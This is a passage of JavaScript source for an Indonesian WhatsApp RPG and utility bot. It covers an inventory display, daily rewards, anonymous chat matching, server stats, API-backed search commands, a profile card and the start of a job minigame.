    let _griffin = global.db.data.users[m.sender].anakgriffin
    let kyubi = global.db.data.users[m.sender].kyubi
    let _kyubi = global.db.data.users[m.sender].anakkyubi
    let centaur = global.db.data.users[m.sender].centaur
    let _centaur = global.db.data.users[m.sender].anakcentaur
    let naga = global.db.data.users[m.sender].naga
    let _naga = global.db.data.users[m.sender].anaknaga
    let diamond = global.db.data.users[m.sender].diamond
    let potion = global.db.data.users[m.sender].potion
    let common = global.db.data.users[m.sender].common
    let makananpet = global.db.data.users[m.sender].makananpet
    let makanannaga = global.db.data.users[m.sender].makanannaga                                         
    let makananphonix = global.db.data.users[m.sender].makananphonix                                     
    let makanangriffin = global.db.data.users[m.sender].makanangriffin
    let makanankyubi = global.db.data.users[m.sender].makanankyubi                                       
    let makanancentaur = global.db.data.users[m.sender].makanancentaur
    let uncommon = global.db.data.users[m.sender].uncommon
    let mythic = global.db.data.users[m.sender].mythic
    let legendary = global.db.data.users[m.sender].legendary
    let level = global.db.data.users[m.sender].level
    let money = global.db.data.users[m.sender].money
    let exp = global.db.data.users[m.sender].exp
    let atm = global.db.data.users[m.sender].atm
    let aqua = global.db.data.users[m.sender].aqua
    let pasangan = global.db.data.users[m.sender].pasangan
    let ramuan = global.db.data.users[m.sender].ramuan
    let kaleng = global.db.data.users[m.sender].kaleng                    
    let kardus = global.db.data.users[m.sender].kardus
    let botol = global.db.data.users[m.sender].botol
    let arlok = global.db.data.users[m.sender].arlok
    let limit = global.db.data.users[m.sender].limit
    let glimit = global.db.data.users[m.sender].glimit
    let sampah = global.db.data.users[m.sender].sampah
    let anggur = global.db.data.users[m.sender].anggur
    let jeruk = global.db.data.users[m.sender].jeruk
    let mangga = global.db.data.users[m.sender].mangga                                      
    let pisang = global.db.data.users[m.sender].pisang                                      
    let bibitanggur = global.db.data.users[m.sender].bibitanggur                            
    let bibitjeruk = global.db.data.users[m.sender].bibitjeruk                              
    let bibitapel = global.db.data.users[m.sender].bibitapel
    let bibitmangga = global.db.data.users[m.sender].bibitmangga                            
    let bibitpisang = global.db.data.users[m.sender].bibitpisang
    let { max } = levelling.xpRange(level, exp, global.multiplier)
    let sortedmoney = Object.entries(global.db.data.users).sort((a, b) => b[1].money - a[1].money)
    let sortedgold = Object.entries(global.db.data.users).sort((a, b) => b[1].gold - a[1].gold)
    let sortedarlok = Object.entries(global.db.data.users).sort((a, b) => b[1].arlok - a[1].arlok)
    let sortedlevel = Object.entries(global.db.data.users).sort((a, b) => b[1].level - a[1].level)
    let sorteddiamond = Object.entries(global.db.data.users).sort((a, b) => b[1].diamond - a[1].diamond)
    let sortedpotion = Object.entries(global.db.data.users).sort((a, b) => b[1].potion - a[1].potion)
    let sortedsampah = Object.entries(global.db.data.users).sort((a, b) => b[1].sampah - a[1].sampah)
    let sortedcommon = Object.entries(global.db.data.users).sort((a, b) => b[1].common - a[1].common)
    let sorteduncommon = Object.entries(global.db.data.users).sort((a, b) => b[1].uncommon - a[1].uncommon)
    let sortedmythic = Object.entries(global.db.data.users).sort((a, b) => b[1].mythic - a[1].mythic)
    let sortedlegendary = Object.entries(global.db.data.users).sort((a, b) => b[1].legendary - a[1].legendary)
    let usersmoney = sortedmoney.map(v => v[0])
    let usersgold = sortedgold.map(v => v[0])
    let usersarlok = sortedarlok.map(v => v[0])
    let usersdiamond = sorteddiamond.map(v => v[0])
    let userspotion = sortedpotion.map(v => v[0])
    let userssampah = sortedsampah.map(v => v[0])
    let userslevel = sortedlevel.map(v => v[0])
    let userscommon = sortedcommon.map(v => v[0])
    let usersuncommon = sorteduncommon.map(v => v[0])
    let usersmythic = sortedmythic.map(v => v[0])
    let userslegendary = sortedlegendary.map(v => v[0])
    
    let kambing = global.db.data.users[m.sender].kambing
    let kerbau = global.db.data.users[m.sender].kerbau
    let harimau = global.db.data.users[m.sender].harimau
    let monyet = global.db.data.users[m.sender].monyet
    let babihutan = global.db.data.users[m.sender].babihutan
    let panda = global.db.data.users[m.sender].panda
    let gajah = global.db.data.users[m.sender].gajah
    let buaya = global.db.data.users[m.sender].buaya
    
    let paus = global.db.data.users[m.sender].paus
    let kepiting = global.db.data.users[m.sender].kepiting
    let gurita = global.db.data.users[m.sender].gurita
    let cumi = global.db.data.users[m.sender].cumi
    let lumba = global.db.data.users[m.sender].lumba
    let lobster = global.db.data.users[m.sender].lobster
    let hiu = global.db.data.users[m.sender].hiu
    let udang = global.db.data.users[m.sender].udang
    let orca = global.db.data.users[m.sender].orca

    let pp = 'https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=Inventory'
    let str = `
*──────────❏ Status ❏──────────*
📡 *Status:* ${premium ? "Premium": "Free"} User
📇 *Name:* ${usrname} 
❗ *Warn:* ${warn}
⛔ *Banned:* No
❤️️ *Health:* ${healt}
⚡ *Stamina:* ${stamina}
💹 *Money:* $${money}
💳 *Bank:* $${atm}
📊 *Level:* ${level}
✨ *Exp:* ${exp}
📍 *Role:* ${role}
🎫 *Limit:* ${limit}
${registered ? '🎨 *Age:* ' + age : ''}
*──────────❏ Tools ❏──────────*
🥼 *Armor:* ${armor == 0 ? '❌' : '' || armor == 1 ? 'Leather Armor' : '' || armor == 2 ? 'Iron Armor' : '' || armor == 3 ? 'Gold Armor' : '' || armor == 4 ? 'Diamond Armor' : '' || armor == 5 ? 'Netherite Armor' : ''}
⚔️ *Sword:* ${sword == 0 ? '❌' : '' || sword == 1 ? 'wooden sword' : '' || sword == 2 ? 'Stone sword' : '' || sword == 3 ? 'Iron sword' : '' || sword == 4 ? 'Diamond sword' : '' || sword > 0 && sword < 5 ? `Ketahanan (*${_sword}* / *${sword *100}*)` : '' || sword == 5 ? '*Netherite Sword*' : ''}
╰ *Durability:* ${sdurability}
⛏️ *Pickaxe:* ${pickaxe == 0 ? '❌' : '' || pickaxe == 1 ? 'wooden pickaxe' : '' || pickaxe == 2 ? 'stone pickaxe' : '' || pickaxe == 3 ? 'Iron pickaxe' : '' || pickaxe == 4 ? 'Diamond pickaxe' : '' || pickaxe == 5 ? 'Netherite pickaxe' : ''}
╰ *Durability:* ${pdurability}
🎣 *Fishingrod:* ${pancing == 0 ? '❌' : '' || pancing == 1 ? 'Wooden Fishingrod' : '' || pancing == 2 ? 'Iron Fishingrod ' : '' || pancing == 1 ? 'Diamond Fishingrod' : '' || pancing == 1 ? 'Netherite Fishingrod' : '' }
╰ *Durability:* ${fdurability}
🏹 *Bow:* Cooming Soon!
*──────────❏ Kandang ❏──────────*
🐔 *Ayam:* ${ayam}    
🐐 *Kambing:* ${kambing}
🐄 *Sapi:* ${sapi} 
🐃 *Kerbau:* ${kerbau}
🐖 *Babi:* ${babi}    
🐅 *Harimau:* ${harimau}
🐂 *Banteng:* ${banteng} 
🐒 *Monyet:* ${monyet}
🐗 *Babi Hutan:* ${babihutan}
🐼 *Panda:* ${panda}
🐘 *Gajah:* ${gajah}
🐊 *Buaya:* ${buaya}
🥢 Bisa kamu masak */masak ayamb*
💬 *Total Hewan:* ${ buaya + gajah + panda + babihutan + monyet + harimau + kerbau + kambing + ayam + sapi + babi + banteng } tangkapan
*──────────❏ Kolam ❏──────────*
🐋 *Orca:* ${orca}
🐳 *Paus:* ${paus}
🐬 *Lumba:* ${lumba}
🦈 *Hiu:* ${hiu}
🐟 *Ikan:* ${ikan}
🐟 *Lele:* ${lele}
🐡 *Bawal:* ${bawal}
🐠 *Nila:* ${nila}
🦀 *Kepiting:* ${kepiting}
🦞 *Lobster:* ${lobster}
🐙 *Gurita:* ${gurita}
🦑 *Cumi:* ${cumi}
🦐 *Udang:* ${udang}
💬 *Total Ikan:* ${orca + udang + hiu + lobster + lumba + cumi + gurita + kepiting + paus + nila + bawal + ikan + lele + psepick + psenjata }
*──────────❏ Inventory ❏──────────*
💎 *Diamond:* ${diamond}
🧪 *Ramuan:* ${ramuan}
🥤 *Potion:* ${potion}
🗑️ *Sampah:* ${sampah}
🥫 *Kaleng:* ${kaleng}
📦 *Kardus:* ${kardus}
🪵  *Kayu:* ${kayu}
🕸️ *String:* ${string}
🪙  *Gold:* ${emas}
⛓  *Iron:* ${besi}
🪨  *Batu:* ${batu}
🧭 *Arloji:* ${arlok}
*──────────❏ Food ❏──────────*
🥓 *FoodPet :* ${makananpet}
🍖 *ayam bakar:* ${ayamb}
🍗 *ayam goreng:* ${ayamg}
🥘 *Rendang Sapi :* ${sapir}
🥩 *steak sapi:* ${ssapi}
🍶 *Aqua:* ${aqua}
🎒 *Total inv:* ${aqua + ramuan + kardus + kaleng + arlok + psepick + psenjata + common + uncommon + mythic + legendary + pet + diamond + potion + besi + emas + string + sampah + kayu + batu + potion + sampah + makananpet + apel + ayamb + ayamg + sapir + ssapi } item
*──────────❏ Fruit & Seed ❏──────────*
🥭 *Mangga:* ${mangga}
🍇 *Anggur:* ${anggur}
🍌 *Pisang:* ${pisang}
🍊 *Jeruk:* ${jeruk}
🍎 *Apel:* ${apel}
🌾 *Bibit Mangga:* ${bibitmangga}
🌾 *Bibit Anggur:* ${bibitanggur}                                    
🌾 *Bibit Pisang:* ${bibitpisang}
🌾 *Bibit Jeruk:* ${bibitjeruk}
🌾 *Bibit Apel:* ${bibitapel}
*──────────❏ Crate ❏──────────*
📦 *Common:* ${common}
🛍️ *Uncommon:* ${uncommon}
🎁 *Mythic:* ${mythic}
🧰 *Legendary:* ${legendary}
📫 *Pet:* ${pet}
*──────────❏ Pet ❏──────────*
🐴 *Kuda:* ${kuda == 0 ? '❌' : '' || kuda == 1 ? 'Level 1' : '' || kuda == 2 ? 'Level 2' : '' || kuda == 3 ? 'Level 3' : '' || kuda == 4 ? 'Level 4' : '' || kuda == 5 ? 'Level MAX' : ''}
🦊 *Rubah:* ${rubah == 0 ? '❌' : '' || rubah == 1 ? 'Level 1' : '' || rubah == 2 ? 'Level 2' : '' || rubah == 3 ? 'Level 3' : '' || rubah == 4 ? 'Level 4' : '' || rubah == 5 ? 'Level MAX' : ''}
🐱 *Kucing:* ${kucing == 0 ? '❌' : '' || kucing == 1 ? 'Level 1' : '' || kucing == 2 ? 'Level 2' : '' || kucing == 3 ? 'Level 3' : '' || kucing == 4 ? 'Level 4' : '' || kucing == 5 ? 'Level MAX' : ''}
🐉 *Naga:* ${naga == 0 ? '❌' : '' || naga == 1 ? 'Level 1' : '' || naga == 2 ? 'Level 2' : '' || naga == 3 ? 'Level 3' : '' || naga == 4 ? 'Level 4' : '' || naga == 5 ? 'Level MAX' : ''}
🦜 *Phonix:* ${phonix == 0 ? '❌' : '' || phonix == 1 ? 'Level 1' : '' || phonix == 2 ? 'Level 2' : '' || phonix == 3 ? 'Level 3' : '' || phonix == 4 ? 'Level 4' : '' || phonix == 5 ? 'Level MAX' : ''}
🐎 *Centaur:* ${centaur == 0 ? '❌' : '' || centaur == 1 ? 'Level 1' : '' || centaur == 2 ? 'Level 2' : '' || centaur == 3 ? 'Level 3' : '' || centaur == 4 ? 'Level 4' : '' || centaur == 5 ? 'Level MAX' : ''}
🦅 *Griffin:* ${griffin == 0 ? '❌' : '' || griffin == 1 ? 'Level 1' : '' || griffin == 2 ? 'Level 2' : '' || griffin == 3 ? 'Level 3' : '' || griffin == 4 ? 'Level 4' : '' || griffin == 5 ? 'Level MAX' : ''}
🐺 *Serigala:* ${serigala == 0 ? '❌' : '' || serigala == 1 ? 'Level 1' : '' || serigala == 2 ? 'Level 2' : '' || serigala == 3 ? 'Level 3' : '' || naga == 4 ? 'Level 4' : '' || serigala == 5 ? 'Level MAX' : ''}
*──────────❏ Progses ❏──────────*
╭────────────────
│ 📊 *Level:* ${level} ➠  ${level + 1}
│ ✨ *Exp:* ${exp} ➠ ${max}
╰────────────────
╭────────────────
│🦊 *Rubah :* ${rubah == 0 ? '❌' : '' || rubah > 0 && rubah < 5 ? `Level *${rubah}* ➠ *${rubah + 1}*\n│Exp *${_rubah}* -> *${rubah *100}*` : '' || rubah == 5 ? '*Max Level*' : ''}
╰────────────────
╭────────────────
│🐱 *Kucing :* ${kucing == 0 ? '❌' : '' || kucing > 0 && kucing < 5 ? `Level *${kucing}* ➠ *${kucing + 1}*\n│Exp *${_kucing}* -> *${kucing *100}*` : '' || kucing == 5 ? '*Max Level*' : ''}
╰────────────────
╭────────────────
│🐴 *Kuda :* ${kuda == 0 ? '❌' : '' || kuda > 0 && kuda < 5 ? `Level *${kuda}* ➠ *${kuda + 1}*\n│Exp *${_kuda}* -> *${kuda *100}*` : '' || kuda == 5 ? '*Max Level*' : ''}
╰────────────────
╭────────────────
│🐉 *Naga :* ${naga == 0 ? '❌' : '' || naga > 0 && naga < 5 ? `Level *${naga}* ➠ *${naga + 1}*\n│Exp *${_naga}* -> *${naga *100}*` : '' || naga == 5 ? '*Max Level*' : ''}
╰────────────────
╭────────────────
│🦜 *Phonix :* ${phonix == 0 ? '❌' : '' || phonix > 0 && phonix < 5 ? `Level *${phonix}* ➠ *${phonix + 1}*\n│Exp *${_phonix}* -> *${phonix *100}*` : '' || phonix == 5 ? '*Max Level*' : ''}
╰────────────────
╭────────────────
│🐎 *Centaur :* ${centaur == 0 ? '❌' : '' || centaur > 0 && centaur < 5 ? `Level *${centaur}* ➠ *${centaur + 1}*\n│Exp *${_centaur}* -> *${centaur *100}*` : '' || centaur == 5 ? '*Max Level*' : ''}
╰────────────────
╭────────────────
│🦅 *Griffin :* ${griffin == 0 ? '❌' : '' || griffin > 0 && griffin < 5 ? `Level *${griffin}* ➠ *${griffin + 1}*\n│Exp *${_griffin}* -> *${griffin *100}*` : '' || griffin == 5 ? '*Max Level*' : ''}
╰────────────────
╭────────────────
│🐺 *Serigala :* ${serigala == 0 ? '❌' : '' || serigala > 0 && serigala < 5 ? `Level *${serigala}* ➠ *${serigala + 1}*\n│Exp *${_serigala}* -> *${serigala *100}*` : '' || serigala == 5 ? '*Max Level*' : ''}
╰────────────────
*──────────❏ Cooldown ❏──────────*
*🏹 Berburu :* ${lastberburu > 0 ? '❌' : '✅'}
*⛰️ Adventure :* ${lastadventure > 0 ? '❌' : '✅'}
*⚔️ Duel :* ${lastduel > 0 ? '❌' : '✅'}
*🛡️ War :* ${lastwar > 0 ? '❌'  : '✅'}
*🎃 Dungeon :* ${lastdungeon > 0 ? '❌' : '✅'}
*💱 Berdagang :* ${lastdagang > 0 ? '❌'  : '✅'}
*🧺 Berkebun :* ${lastberkebon > 0 ? '❌'  : '✅'}
*⛏️ Mining :* ${lastmining > 0 ? '❌' : '✅'}
*🎣 Fishing :* ${lastfishing > 0 ? '❌'  : '✅'}
*💰 Bansos :* ${lastbansos > 0 ? '❌' : '✅'}
*🕐 Hourly :* ${lasthourly > 0 ? '❌' : '✅'}
*📦 Claim :* ${lastclaim > 0 ? '❌' : '✅'}
*🎁 Weekly :* ${lastweekly > 0 ? '❌' : '✅'}
*📮 Monthly :* ${lastmonthly > 0 ? '❌' : '✅'}
*──────────❏ Achievement ❏──────────*
📊 *Top level:* ${userslevel.indexOf(m.sender) + 1} / ${userslevel.length}
💹 *Top Money:* ${usersmoney.indexOf(m.sender) + 1} / ${usersmoney.length}
🪙  *Top Gold:* ${usersgold.indexOf(m.sender) + 1} / ${usersgold.length}
💎 *Top Diamond:* ${usersdiamond.indexOf(m.sender) + 1} / ${usersdiamond.length}
🧭 *Top Arloji:* ${usersarlok.indexOf(m.sender) + 1} / ${usersarlok.length}
🥤 *Top Potion:* ${userspotion.indexOf(m.sender) + 1} / ${userspotion.length}
📦 *Top Common:* ${userscommon.indexOf(m.sender) + 1} / ${userscommon.length}
🛍️ *Top Uncommon:* ${usersuncommon.indexOf(m.sender) + 1} / ${usersuncommon.length}
🎁 *Top Mythic:* ${usersmythic.indexOf(m.sender) + 1} / ${usersmythic.length}
🧰 *Top Legendary:* ${userslegendary.indexOf(m.sender) + 1} / ${userslegendary.length}
🗑️ *Top Sampah:* ${userssampah.indexOf(m.sender) + 1} / ${userssampah.length}
`
hisoka.sendMessage(m.chat, { text: `${readMore + str}`,
  contextInfo: {   
            externalAdReply :{
    mediaUrl: `${flaminge + 'inventory'}`,
    renderLargerThumbnail: true,
    mediaType: 1,
    description: `Ok`, 
    body: `Powered By ©AhmdLui`,
    thumbnail: await getBuffer(flaminge + 'inventory'),
    sourceUrl: ``
     }}
  }, { quoted: fgclink })
}
break
    case prefix+'daily': {
        let user = global.db.data.users[m.sender]
    let __timers = (new Date - user.lastclaim2)
    let _timers = (86400000 - __timers)
    let timers = clockString(_timers) 
    if (new Date - user.lastclaim2 > 86400000) {
        m.reply(`Anda sudah mengklaim dan mendapatkan 300 XP, 1000 💵money dan 1 potion`)
        global.db.data.users[m.sender].money += 1000
        global.db.data.users[m.sender].potion += 1
        global.db.data.users[m.sender].exp += 300
        global.db.data.users[m.sender].lastclaim2 = new Date * 1
    } else {
        m.reply(`silahkan tunggu *🕒${timers}* lagi untuk bisa mengclaim lagi`)
    }
}
break
            case prefix+'next': case prefix+'lanjut': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                let romeo = Object.values(db.data.anonymous).find(room => room.check(m.sender))
                if (!romeo) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner\`\`\``)
                    throw false
                }
                let other = romeo.other(m.sender)
                if (other) await hisoka.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
                delete db.data.anonymous[romeo.id]
                let room = Object.values(db.data.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, hisoka.user.name, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await hisoka.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, hisoka.user.name, m)
                } else {
                    let id = + new Date
                    db.data.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, hisoka.user.name, m)
                }
                break
            }
            case prefix+'public': {
                if (!isCreator) throw mess.owner
                hisoka.public = true
                m.reply('Sukse Change To Public Usage')
            }
            break
            case prefix+'self': {
                if (!isCreator) throw mess.owner
                hisoka.public = false
                m.reply('Sukses Change To Self Usage')
            }
            break
            case prefix+'ping': case prefix+'botstatus': case prefix+'statusbot': {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                hisoka.sendMessage(m.chat, waitv2, { quoted: m })
                m.reply(respon)
            }
            break
            case prefix+'speedtest': {
            m.reply('Testing Speed...')
            let cp = require('child_process')
            let { promisify } = require('util')
            let exec = promisify(cp.exec).bind(cp)
          let o
          try {
          o = await exec('python speed.py')
          } catch (e) {
          o = e
         } finally {
        let { stdout, stderr } = o
        if (stdout.trim()) m.reply(stdout)
        if (stderr.trim()) m.reply(stderr)
            }
            }
            break
            case prefix+'owner': case prefix+'creator': {
                hisoka.sendContact(m.chat, global.owner, m)
            }
            break
            case prefix+'playstore': {
            if (!text) throw `Example : ${prefix + command} clash of clans`
            let res = await fetchJson(api('zenz', '/webzone/playstore', { query: text }, 'apikey'))
            let teks = `⭔ Playstore Search From : ${text}\n\n`
            for (let i of res.result) {
            teks += `⭔ Name : ${i.name}\n`
            teks += `⭔ Link : ${i.link}\n`
            teks += `⭔ Developer : ${i.developer}\n`
            teks += `⭔ Link Developer : ${i.link_dev}\n\n──────────────────────\n`
            }
            m.reply(teks)
            }
            break
            case prefix+'gsmarena': {
            if (!text) throw `Example : ${prefix + command} samsung`
            let res = await fetchJson(api('zenz', '/webzone/gsmarena', { query: text }, 'apikey'))
            let { judul, rilis, thumb, ukuran, type, storage, display, inchi, pixel, videoPixel, ram, chipset, batrai, merek_batre, detail } = res.result
let capt = `⭔ Title: ${judul}
⭔ Realease: ${rilis}
⭔ Size: ${ukuran}
⭔ Type: ${type}
⭔ Storage: ${storage}
⭔ Display: ${display}
⭔ Inchi: ${inchi}
⭔ Pixel: ${pixel}
⭔ Video Pixel: ${videoPixel}
⭔ Ram: ${ram}
⭔ Chipset: ${chipset}
⭔ Battery: ${batrai}
⭔ Battery Brand: ${merek_batre}
⭔ Detail: ${detail}`
            hisoka.sendImage(m.chat, thumb, capt, m)
            }
            break
            case prefix+'jadwalbioskop': {
            if (!text) throw `Example: ${prefix + command} jakarta`
            let res = await fetchJson(api('zenz', '/webzone/jadwalbioskop', { kota: text }, 'apikey'))
            let capt = `Jadwal Bioskop From : ${text}\n\n`
            for (let i of res.result){
            capt += `⭔ Title: ${i.title}\n`
            capt += `⭔ Thumbnail: ${i.thumb}\n`
            capt += `⭔ Url: ${i.url}\n\n──────────────────────\n`
            }
            hisoka.sendImage(m.chat, res.result[0].thumb, capt, m)
            }
            break
            case prefix+'nowplayingbioskop': {
           let now = await bochil.bioskopNow()
           let su = pickRandom(now)
 hisoka.sendMessage(m.chat, { text: `Genre: ${su.genre}\nDurasi: ${su.duration}\nPlaying in ${su.playingAt}`,
 contextInfo: {   
            externalAdReply :{
    mediaUrl: `${su.img}`,
    renderLargerThumbnail: true,
    mediaType: 1,
    description: `Ok` , 
    title: `${su.title}`,
    thumbnail: await getBuffer(su.img),
    sourceUrl: `${su.url}`
     }}
  }, { quoted: m })
            }
            break
            case prefix+'profile': {
            let PhoneNumber = require('awesome-phonenumber')
  let pp = await getBuffer('https://telegra.ph/file/182775cf8fb53a436a1d9.jpg')
  let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? hisoka.user.jid : m.sender
  try {
    pp = await hisoka.profilePictureUrl(who, 'image')
  } catch (e) {

  } finally {
    let { name, premium, level, limit, exp, lastclaim, registered, regTime, age } = global.db.data.users[m.sender]
    let username = hisoka.getName(who)
    let str = `

✧──────────[ *PROFILE* ]──────────✧
📇 • *Name:* ${username} ${registered ? '(' + name + ') ': ''}
📧 • *Tag:* @${who.replace(/@.+/, '')}
📞 • *Number:* ${PhoneNumber('+' + who.replace('@s.whatsapp.net', '')).getNumber('international')}
💻 • *Link:* https://wa.me/${who.split`@`[0]}
${registered ? '🎨 • *Age:* ' + age : ''}

🌟 • *Premium:* ${premium ? "✅" :"❌"}
📑 • *Registered:* ${registered ? '✅': '❌'}
⛔ • *Banned:* ❌

`.trim()
    let mentionedJid = [who]
    hisoka.sendMessage(m.chat, { image: { url: pp }, caption: str, contextInfo: { mentionedJid }}, { quoted: fgclink })
  }
}
break
            case prefix+'aminio': {
            if (!text) throw `Example: ${prefix + command} free fire`
            let res = await fetchJson(api('zenz', '/webzone/amino', { query: text }, 'apikey'))
            let capt = `Aminio Search From : ${text}\n\n`
            for (let i of res.result){
            capt += `⭔ Community: ${i.community}\n`
            capt += `⭔ Community Link: ${i.community_link}\n`
            capt += `⭔ Thumbnail: ${i.community_thumb}\n`
            capt += `⭔ Description: ${i.community_desc}\n`
            capt += `⭔ Member Count: ${i.member_count}\n\n──────────────────────\n`
            }
            hisoka.sendImage(m.chat, 'https://'+res.result[0].community_thumb, capt, m)
            }
            break            
            case prefix+'wattpad': {
            if (!text) throw `Example : ${prefix + command} love`
            let wat = await aliya.wattpad(text)
            let bilek = wat[Math.floor(Math.random() * wat.length)]
            hisoka.sendMessage(m.chat, { text: `Desc: ${bilek.description}\n${bilek.divote} Tervote\nTelah di baca oleh ${bilek.dibaca} Orang\nDan Telah Mendapat Bab BerJumlah ${bilek.bab}`, contextInfo: {   
            externalAdReply :{
    mediaUrl: `${bilek.thumb}`,
    renderLargerThumbnail: true,
    mediaType: 1,
    description: `Ok` , 
    title: `${bilek.judul}`,
    body: ``,
    thumbnail: await getBuffer(bilek.thumb),
    sourceUrl: `${bilek.url}`
     }}
     }, { quoted: m })
              }
            break
            case prefix+'drakor': {
            if (!text) throw `Example : ${prefix + command} love`
            let res = await fetchJson(api('zenz', '/webzone/drakor', { query: text }, 'apikey'))
            let capt = `Drakor Search From : ${text}\n\n`
            for (let i of res.result) {
            capt += `⭔ Judul: ${i.judul}\n`
            capt += `⭔ Years: ${i.years}\n`
            capt += `⭔ Genre: ${i.genre}\n`
            capt += `⭔ Url: ${i.url}\n`
            capt += `⭔ Thumbnail Url: ${i.thumbnail}\n\n──────────────────────\n`
            }
            hisoka.sendImage(m.chat, res.result[0].thumbnail, capt, m)
            }
            break
            case prefix+'tiktokfyp': {
            let cuaks = await bochil.tiktokfyp()
            hisoka.sendMessage(m.chat, { text: pickRandom(cuaks) }, { quoted: fgif })
            }
            break
            case prefix+'listtiktokfyp': {
            let cuaks = await bochil.tiktokfyp()
            listSerch = []
           for (let i of cuaks) {
listSerch.push({
title: i.desc, rowId: `${prefix}`, description: `up in ${i.createTime} ms`})
                }
const sections = [
{
title: "TiktokFyp",
rows: listSerch
}
]
const listMessage = {
text: `Tiktok Fyp`,
footer: `Simple whatsapp Bot`,
title: "",
buttonText: "List Search",
sections
}
hisoka.sendMessage(m.chat, listMessage, {quoted:m})
                  }
            break
            case prefix+'kerja': {
            let type = (args[0] || '').toLowerCase()
let users = db.data.users[m.sender]
let time = db.data.users[m.sender].lastjb = 300000
//let __timers = (new Date - global.db.data.users[m.sender].lastkerja)
   // let _timers = (0 - __timers)
   // let timers = clockString(_timers) 
    //JANGAN DI OTAK ATIK
//THIS PLUGINS BY RIZKY
//THIS RECODE CASE BY LUI
//PEMBATAS
let penumpan = ['mas mas','bapak bapak','cewe sma','bocil epep','emak emak']
let penumpang = penumpan[Math.floor(Math.random() * penumpan.length)]
let daganga = ['wortel','sawi','selada','tomat','seledri','cabai','daging','ikan','ayam']
let dagangan = daganga[Math.floor(Math.random() * daganga.length)]
let pasie = ['sakit kepala','cedera','luka bakar','patah tulang']
let pasien = pasie[Math.floor(Math.random() * pasie.length)]
let pane = ['Wortel','Kubis','stowbery','teh','padi','jeruk','pisang','semangka','durian','rambutan']
let panen = pane[Math.floor(Math.random() * pane.length)]
let bengke = ['mobil','motor','becak','bajai','bus','angkot','becak','sepeda']
let bengkel = bengke[Math.floor(Math.random() * bengke.length)]
let ruma = ['Membangun Rumah','Membangun Gedung','Memperbaiki Rumah','Memperbaiki Gedung','Membangun Fasilitas Umum','Memperbaiki Fasilitas Umum']
let rumah = ruma[Math.floor(Math.random() * ruma.length)]

let pppecat = ['Ruko Kebakaran','LO NGOCOK DIDEPAN UMUM','Males Malesan','Ngew istrinya yg punya ruko']
let alasanpecat = pppecat[Math.floor(Math.random() * pppecat.length)]
let ddppecat = ['Bakar Pasien','Jual Organ Dalem ke Lapak ilegal','serinv telat']
let alasanpasien = ddppecat[Math.floor(Math.random() * ddppecat.length)]
//Uang
let uangm = Math.floor(Math.random() * 10) + 4000
let duit = Math.floor(Math.random() * 20) + 2500
let duitm = Math.floor(Math.random() * 50) + 9500
let duitd = Math.floor(Math.random() * 62) + 5200
let duitr = Math.floor(Math.random() * 20) + 4200
let duitk = Math.floor(Math.random() * 70) + 7800
//ANJAY
let _pecat= `${pickRandom(['1', '1', '1', '1'])}`
            let pecat = (_pecat * 1)
            let ppecat = `KAMU KENA PECAT KARNA KAMU ${alasanpecat}`
let _dpecat = `${pickRandom(['1', '0', '0', '1'])}`
            let dpecat = (_dpecat * 1)
            let dppecat = `KAMU DI PECAT KARNA ${alasanpasien}`
//GAK RAPIH G GANTENG
